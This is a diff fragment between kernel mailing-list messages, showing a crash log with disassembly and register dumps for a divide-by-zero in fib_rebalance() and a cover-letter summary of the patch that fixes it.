+   4:	89 4d d4             	mov    %ecx,-0x2c(%rbp)
+   7:	e8 64 f5 01 00       	call   0x1f570
+   c:	44 8b 55 d4          	mov    -0x2c(%rbp),%r10d
+  10:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
+  14:	45 31 c9             	xor    %r9d,%r9d
+  17:	89 c3                	mov    %eax,%ebx
+  19:	48 8b 75 e0          	mov    -0x20(%rbp),%rsi
+  1d:	8b 7d e8             	mov    -0x18(%rbp),%edi
+  20:	45 31 c0             	xor    %r8d,%r8d
+  23:	b8 2c 00 00 00       	mov    $0x2c,%eax
+  28:	0f 05                	syscall
+  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
+  30:	77 36                	ja     0x68
+  32:	89 df                	mov    %ebx,%edi
+  34:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
+  38:	e8 b3 f5 01 00       	call   0x1f5f0
+  3d:	48                   	rex.W
+  3e:	8b                   	.byte 0x8b
+  3f:	45                   	rex.RB
+
+Code starting with the faulting instruction
+===========================================
+   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
+   6:	77 36                	ja     0x3e
+   8:	89 df                	mov    %ebx,%edi
+   a:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
+   e:	e8 b3 f5 01 00       	call   0x1f5c6
+  13:	48                   	rex.W
+  14:	8b                   	.byte 0x8b
+  15:	45                   	rex.RB
+[   30.824808] RSP: 002b:00007f77f6b231a0 EFLAGS: 00000246 ORIG_RAX: 000000000000002c
+[   30.826321] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 000000000042196a
+[   30.827805] RDX: 0000000000000ca8 RSI: 00000000004ccb80 RDI: 0000000000000004
+[   30.829200] RBP: 00007f77f6b231d0 R08: 0000000000000000 R09: 0000000000000000
+[   30.830667] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000004
+[   30.832176] R13: 0000000000000ca8 R14: 00000000004ccba0 R15: 0000000000000174
+[   30.833748]  </TASK>
+[   30.834239] Modules linked in:
+[   30.834998] ---[ end trace 0000000000000000 ]---
+[   30.836032] RIP: 0010:fib_rebalance (net/ipv4/fib_semantics.c:884)
+[   30.837028] Code: 78 45 85 db 75 0a 8b 80 38 01 00 00 85 c0 74 0a 83 e2 10 b8 ff ff ff ff 75 97 44 03 51 28 31 d2 49 63 c2 48 c1 e0 1f 4c 01 c8 <49> f7 f0 83 e8 01 e9 7c ff ff ff 80 7a 66 00 74 0d 48 8b 82 80 00
+All code
+========
+   0:	78 45                	js     0x47
+   2:	85 db                	test   %ebx,%ebx
+   4:	75 0a                	jne    0x10
+   6:	8b 80 38 01 00 00    	mov    0x138(%rax),%eax
+   c:	85 c0                	test   %eax,%eax
+   e:	74 0a                	je     0x1a
+  10:	83 e2 10             	and    $0x10,%edx
+  13:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
+  18:	75 97                	jne    0xffffffffffffffb1
+  1a:	44 03 51 28          	add    0x28(%rcx),%r10d
+  1e:	31 d2                	xor    %edx,%edx
+  20:	49 63 c2             	movslq %r10d,%rax
+  23:	48 c1 e0 1f          	shl    $0x1f,%rax
+  27:	4c 01 c8             	add    %r9,%rax
+  2a:*	49 f7 f0             	div    %r8		<-- trapping instruction
+  2d:	83 e8 01             	sub    $0x1,%eax
+  30:	e9 7c ff ff ff       	jmp    0xffffffffffffffb1
+  35:	80 7a 66 00          	cmpb   $0x0,0x66(%rdx)
+  39:	74 0d                	je     0x48
+  3b:	48                   	rex.W
+  3c:	8b                   	.byte 0x8b
+  3d:	82                   	(bad)
+  3e:	80                   	.byte 0x80
+	...
+
+Code starting with the faulting instruction
+===========================================
+   0:	49 f7 f0             	div    %r8
+   3:	83 e8 01             	sub    $0x1,%eax
+   6:	e9 7c ff ff ff       	jmp    0xffffffffffffff87
+   b:	80 7a 66 00          	cmpb   $0x0,0x66(%rdx)
+   f:	74 0d                	je     0x1e
+  11:	48                   	rex.W
+  12:	8b                   	.byte 0x8b
+  13:	82                   	(bad)
+  14:	80                   	.byte 0x80
+	...
+[   30.840896] RSP: 0018:ffffaa56402639e8 EFLAGS: 00010206
+[   30.841958] RAX: 0000000080000000 RBX: ffff89a8843cd1c0 RCX: ffff89a8843c8080
+[   30.843492] RDX: 0000000000000000 RSI: ffff89a8843c8000 RDI: 0000000000000000
+[   30.845173] RBP: ffff89a882149f80 R08: 0000000000000000 R09: 0000000000000000
+[   30.846650] R10: 0000000000000001 R11: 0000000000000000 R12: 0000000000000000
+[   30.848296] R13: 00000000000000c8 R14: 0000000000000000 R15: ffff89a8843c8000
+[   30.849869] FS:  00007f77f6b236c0(0000) GS:ffff89a974a69000(0000) knlGS:0000000000000000
+[   30.852188] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   30.853477] CR2: 00000000004cf000 CR3: 00000000022e9005 CR4: 0000000000370ef0
+
+-----END crash log-----
 
 Best regards,
+Zihan Xi
 
-Michael
+Zihan Xi (1):
+  ipv4: Fix fib_rebalance() divide-by-zero race
 
->  			break;
-> +		}
->  	}
->=20
-> -out:
->  	of_node_put(ports);
->=20
->  	return port;
-> --
-> 2.46.2.windows.1
+ net/ipv4/devinet.c | 22 ++++++++++++++++++++--
+ 1 file changed, 20 insertions(+), 2 deletions(-)
+
+-- 
+2.43.0
 
